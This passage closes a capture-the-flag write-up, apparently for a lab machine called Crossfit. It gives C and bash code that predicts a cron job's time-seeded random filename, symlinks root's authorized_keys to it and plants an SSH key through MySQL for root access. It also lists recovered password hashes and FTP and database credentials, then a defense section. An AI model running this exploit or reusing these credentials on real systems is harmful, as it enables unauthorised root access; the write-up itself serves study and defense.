+<div style="position:absolute;left:87.97px;top:432.05px" class="cls_020"><span class="cls_020">time_t next</span></div>
+<div style="position:absolute;left:161.36px;top:432.80px" class="cls_020"><span class="cls_020">=</span><span class="cls_018"> </span><span class="cls_020">now - (now % </span><span class="cls_023">60</span><span class="cls_020">) + </span><span class="cls_023">61</span><span class="cls_020">; </span><span class="cls_024">/*this</span><span class="cls_018"> </span><span class="cls_024">will</span><span class="cls_018"> </span><span class="cls_024">store</span><span class="cls_018"> </span><span class="cls_024">the</span><span class="cls_018"> </span><span class="cls_024">next</span><span class="cls_018"> </span><span class="cls_024">minute</span><span class="cls_018"> </span><span class="cls_024">+1</span></div>
+<div style="position:absolute;left:63.50px;top:450.80px" class="cls_024"><span class="cls_024">second timestamp*/</span></div>
+<div style="position:absolute;left:87.96px;top:486.80px" class="cls_022"><span class="cls_022">printf</span><span class="cls_020">(</span><span class="cls_021">"CURRENT</span><span class="cls_018"> </span><span class="cls_021">TIMESTAMP:</span><span class="cls_018"> </span><span class="cls_021">%d\n"</span><span class="cls_020">,now );</span></div>
+<div style="position:absolute;left:87.96px;top:504.80px" class="cls_022"><span class="cls_022">printf</span><span class="cls_020">(</span><span class="cls_021">"NEXT</span><span class="cls_018"> </span><span class="cls_021">TIMESTAMP:</span><span class="cls_018"> </span><span class="cls_021">%d\n"</span><span class="cls_020">,next );</span></div>
+<div style="position:absolute;left:87.96px;top:540.80px" class="cls_022"><span class="cls_022">srand</span><span class="cls_020">(next);</span></div>
+<div style="position:absolute;left:87.96px;top:558.80px" class="cls_022"><span class="cls_022">printf</span><span class="cls_020">(</span><span class="cls_021">"%d\n"</span><span class="cls_020">,</span><span class="cls_022">rand</span><span class="cls_020">() );</span></div>
+<div style="position:absolute;left:87.96px;top:576.80px" class="cls_019"><span class="cls_019">return</span><span class="cls_020"> </span><span class="cls_023">0</span><span class="cls_020">;</span></div>
+<div style="position:absolute;left:63.50px;top:594.80px" class="cls_020"><span class="cls_020">}</span></div>
+<div style="position:absolute;left:51.50px;top:634.25px" class="cls_006"><span class="cls_006">This code will return the current timestamp and also the next timestamp that is the</span></div>
+<div style="position:absolute;left:51.50px;top:652.25px" class="cls_006"><span class="cls_006">random number than will be used by the program to create its file when the next cronjob</span></div>
+<div style="position:absolute;left:51.50px;top:670.25px" class="cls_006"><span class="cls_006">starts.SO we have basically 1 minute to do all the arrangements.Because of which script</span></div>
+<div style="position:absolute;left:51.50px;top:688.25px" class="cls_006"><span class="cls_006">was created to automate this.</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:13634px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background18.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:45.05px" class="cls_027"><span class="cls_027">#!/bin/bash</span></div>
+<div style="position:absolute;left:63.50px;top:63.05px" class="cls_020"><span class="cls_020">id=</span><span class="cls_023">1</span></div>
+<div style="position:absolute;left:63.50px;top:81.05px" class="cls_020"><span class="cls_020">name=</span><span class="cls_021">"ssh-ed25519"</span></div>
+<div style="position:absolute;left:63.50px;top:99.05px" class="cls_020"><span class="cls_020">email=</span><span class="cls_021">"root@bhosa"</span></div>
+<div style="position:absolute;left:63.50px;top:117.05px" class="cls_020"><span class="cls_020">message=</span><span class="cls_021">"AAAAC3NzaC1lZDI1NTE5AAAAIK/FLoEjFzZJo8SonMKVgF1N0eOlQx/YQtDiglNlpDEg"</span></div>
+<div style="position:absolute;left:63.50px;top:153.05px" class="cls_020"><span class="cls_020">rand=$(/dev/shm/simple_rand)</span></div>
+<div style="position:absolute;left:63.50px;top:171.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"Next</span><span class="cls_018"> </span><span class="cls_021">Cronjob</span><span class="cls_018"> </span><span class="cls_021">Timestamp: </span><span class="cls_020">${rand}</span><span class="cls_021">"</span></div>
+<div style="position:absolute;left:63.50px;top:207.05px" class="cls_020"><span class="cls_020">filename=$(</span><span class="cls_022">echo</span><span class="cls_018"> </span><span class="cls_020">-n </span><span class="cls_021">"</span><span class="cls_020">${rand}${id}</span><span class="cls_021">"</span><span class="cls_020"> |</span><span class="cls_018"> </span><span class="cls_020">md5sum | </span><span class="cls_022">awk</span><span class="cls_020"> </span><span class="cls_021">'{print </span><span class="cls_020">$1</span><span class="cls_021">}'</span><span class="cls_020">)</span></div>
+<div style="position:absolute;left:63.50px;top:225.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"FILENAME: </span><span class="cls_020">${filename}</span><span class="cls_021">"</span></div>
+<div style="position:absolute;left:63.50px;top:243.05px" class="cls_022"><span class="cls_022">ln</span><span class="cls_018"> </span><span class="cls_020">-s</span><span class="cls_018"> </span><span class="cls_020">/root/.ssh/authorized_keys ${filename}</span></div>
+<div style="position:absolute;left:63.50px;top:261.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"[+]CREATED</span><span class="cls_018"> </span><span class="cls_021">A</span><span class="cls_018"> </span><span class="cls_021">SYMLINK"</span></div>
+<div style="position:absolute;left:63.50px;top:279.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"[+]ENTERING</span><span class="cls_018"> </span><span class="cls_021">THE</span><span class="cls_018"> </span><span class="cls_021">SSH</span><span class="cls_018"> </span><span class="cls_021">PUB</span><span class="cls_018"> </span><span class="cls_021">KEY</span><span class="cls_018"> </span><span class="cls_021">IN</span><span class="cls_018"> </span><span class="cls_021">DATABASE(crossfit,messages)"</span></div>
+<div style="position:absolute;left:63.50px;top:297.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"[+]INFO:(id,name,email,message)--->(</span><span class="cls_020">${id}</span><span class="cls_021">,</span><span class="cls_020">${name}</span><span class="cls_021">,</span><span class="cls_020">${email}</span><span class="cls_021">,</span><span class="cls_020">${message}</span><span class="cls_021">)"</span></div>
+<div style="position:absolute;left:63.50px;top:315.05px" class="cls_020"><span class="cls_020">mysql</span><span class="cls_018"> </span><span class="cls_020">-u</span><span class="cls_018"> </span><span class="cls_020">crossfit</span><span class="cls_018"> </span><span class="cls_020">-p</span><span class="cls_018"> </span><span class="cls_020">oeLoo~y2baeni</span><span class="cls_018"> </span><span class="cls_020">crossfit</span><span class="cls_018"> </span><span class="cls_020">-e </span><span class="cls_021">"insert</span><span class="cls_018"> </span><span class="cls_021">into</span><span class="cls_018"> </span><span class="cls_021">messages(id,</span><span class="cls_018"> </span><span class="cls_021">name,</span></div>
+<div style="position:absolute;left:63.50px;top:333.05px" class="cls_021"><span class="cls_021">email,</span><span class="cls_018"> </span><span class="cls_021">message)</span><span class="cls_018"> </span><span class="cls_021">values</span><span class="cls_018"> </span><span class="cls_021">(</span><span class="cls_020">$id</span><span class="cls_021">,</span><span class="cls_018"> </span><span class="cls_021">'</span><span class="cls_020">$name</span><span class="cls_021">',</span><span class="cls_018"> </span><span class="cls_021">'</span><span class="cls_020">$email</span><span class="cls_021">',</span><span class="cls_018"> </span><span class="cls_021">'</span><span class="cls_020">$message</span><span class="cls_021">')"</span></div>
+<div style="position:absolute;left:63.50px;top:351.05px" class="cls_020"><span class="cls_020">sec=$((</span><span class="cls_023">60</span><span class="cls_020"> -</span><span class="cls_018"> </span><span class="cls_020">$(date +%-S)))</span></div>
+<div style="position:absolute;left:63.50px;top:369.05px" class="cls_019"><span class="cls_019">while</span><span class="cls_020"> [ $sec</span><span class="cls_018"> </span><span class="cls_020">-ne </span><span class="cls_023">59</span><span class="cls_020"> ];</span><span class="cls_019">do</span></div>
+<div style="position:absolute;left:87.96px;top:387.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_018"> </span><span class="cls_020">-en </span><span class="cls_021">"</span><span class="cls_020">\r</span><span class="cls_021">[*]SECONDS</span><span class="cls_018"> </span><span class="cls_021">LEFT</span><span class="cls_018"> </span><span class="cls_021">UNTIL</span><span class="cls_018"> </span><span class="cls_021">NEXT</span><span class="cls_018"> </span><span class="cls_021">CRON: </span><span class="cls_020">${sec}</span><span class="cls_021">"</span></div>
+<div style="position:absolute;left:87.96px;top:405.05px" class="cls_022"><span class="cls_022">sleep</span><span class="cls_020"> </span><span class="cls_023">1</span></div>
+<div style="position:absolute;left:87.96px;top:423.05px" class="cls_020"><span class="cls_020">sec=$((</span><span class="cls_023">60</span><span class="cls_020"> -</span><span class="cls_018"> </span><span class="cls_020">$(date +%-S)))</span></div>
+<div style="position:absolute;left:63.50px;top:441.05px" class="cls_019"><span class="cls_019">done</span></div>
+<div style="position:absolute;left:63.50px;top:459.05px" class="cls_022"><span class="cls_022">echo</span><span class="cls_020"> </span><span class="cls_021">"[+]NOW</span><span class="cls_018"> </span><span class="cls_021">TRY</span><span class="cls_018"> </span><span class="cls_021">TO</span><span class="cls_018"> </span><span class="cls_021">SSH</span><span class="cls_018"> </span><span class="cls_021">AS</span><span class="cls_018"> </span><span class="cls_021">ROOT"</span></div>
+<div style="position:absolute;left:51.50px;top:494.75px" class="cls_002"><span class="cls_002">CREDENTIALS</span></div>
+<div style="position:absolute;left:63.50px;top:557.30px" class="cls_020"><span class="cls_020">$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZC</span></div>
+<div style="position:absolute;left:51.50px;top:622.25px" class="cls_006"><span class="cls_006">ftp:ftpadm:8W)}gpRJvAmnb</span></div>
+<div style="position:absolute;left:51.50px;top:640.25px" class="cls_006"><span class="cls_006">mysql:crossfit:oeLoo~y2baeni</span></div>
+<div style="position:absolute;left:51.50px;top:667.25px" class="cls_002"><span class="cls_002">DEFENSE</span></div>
+<div style="position:absolute;left:49.25px;top:718.25px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> The first exploit was xss in the report sent to admin.</span></div>
+<div style="position:absolute;left:74.95px;top:736.25px" class="cls_006"><span class="cls_006">SOLUTION WOULD BE TO SANITIZE AND FILTER THE REPORT THAT IS SENT TO</span></div>
+</div>
+<div style="position:absolute;left:50%;margin-left:-306px;top:14436px;width:612px;height:792px;border-style:outset;overflow:hidden">
+<div style="position:absolute;left:0px;top:0px">
+<img src="82206a6e-9499-11eb-8b25-0cc47a792c0a_id_82206a6e-9499-11eb-8b25-0cc47a792c0a_files/background19.jpg" width=612 height=792></div>
+<div style="position:absolute;left:63.50px;top:30.50px" class="cls_006"><span class="cls_006">THE ADMIN .</span></div>
+<div style="position:absolute;left:49.25px;top:48.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> The second exploit CORS WEAKNESS.</span></div>
+<div style="position:absolute;left:78.33px;top:66.50px" class="cls_006"><span class="cls_006">Cant do much as it was only used to find a sub-domain.</span></div>
+<div style="position:absolute;left:49.25px;top:84.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> The third exploit that lead to rfi and rce was development-test subdomain accepting</span></div>
+<div style="position:absolute;left:63.50px;top:102.50px" class="cls_006"><span class="cls_006">files via lftp.</span></div>
+<div style="position:absolute;left:78.33px;top:120.50px" class="cls_006"><span class="cls_006">MAKE SURE THAT PERMISIION IS DENIED FOR OTHER USERS TO UPLOAD TO</span></div>
+<div style="position:absolute;left:63.50px;top:138.50px" class="cls_006"><span class="cls_006">FTP.</span></div>
+<div style="position:absolute;left:49.25px;top:156.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Hardcoded password of hank in ansible.</span></div>
+<div style="position:absolute;left:78.33px;top:174.50px" class="cls_006"><span class="cls_006">MAKE SURE THAT PASSWORDS ARE STRONG.</span></div>
+<div style="position:absolute;left:49.25px;top:192.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> Outdated php module</span></div>
+<div style="position:absolute;left:78.33px;top:210.50px" class="cls_006"><span class="cls_006">UPDATE TO THE LATEST VERSION OF THE MODULE.</span></div>
+<div style="position:absolute;left:78.33px;top:228.50px" class="cls_006"><span class="cls_006">ALSO MAKE SURE THAT DB PASSWORDS ARE NOT HARDCODED.</span></div>
+<div style="position:absolute;left:49.25px;top:246.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> DBMSG BEING BADLY CODED.</span></div>
+<div style="position:absolute;left:74.95px;top:264.50px" class="cls_006"><span class="cls_006">IT NEEDS TO STRIPPED.</span></div>
+<div style="position:absolute;left:74.95px;top:282.50px" class="cls_006"><span class="cls_006">IT NEEDS TO FIND A DIFFERENT SEED AS TIME IS EASILY PREDICTABLE IF CRON</span></div>
+<div style="position:absolute;left:63.50px;top:300.50px" class="cls_006"><span class="cls_006">RUNS IT EVERY MINUTE.</span></div>
+<div style="position:absolute;left:51.50px;top:333.50px" class="cls_002"><span class="cls_002">FLAGS</span></div>
+<div style="position:absolute;left:51.50px;top:378.50px" class="cls_002"><span class="cls_002">THINGS LEARNT</span></div>
+<div style="position:absolute;left:49.25px;top:429.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> XSS VIA JAVASCRIPT FILES AND BIG CODES.</span></div>
+<div style="position:absolute;left:49.25px;top:447.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> TO ENUMERATE HARDER.</span></div>
+<div style="position:absolute;left:49.25px;top:465.50px" class="cls_005"><span class="cls_005"></span><span class="cls_006"> MYSQL COMMANDS AND SOME BASH SCRIPTING</span></div>
+</div>
+
+</body>
+</html>
